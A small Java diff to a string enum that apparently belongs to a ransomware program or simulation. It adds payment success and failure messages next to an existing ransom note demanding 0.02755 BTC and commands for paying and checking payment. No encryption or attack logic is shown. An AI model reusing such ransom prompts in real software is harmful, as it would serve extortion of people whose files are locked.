@@ -7,7 +7,10 @@ public enum ConsoleCorrespondation {
     CL_SHOWRECIPIENT("show recipient"),
     CL_PAYBTC("pay 0.02755 BTC"),
     CL_CHECKPAYMENT("check payment"),
-    M_ENCRYPTED("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted");
+    M_ENCRYPTED("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted"),
+    M_TRANSACTIONSUCCESS("Transaction successful"),
+    M_TRANSACTIONFAIL("Transaction failed");
+
 
 
     private final String value;
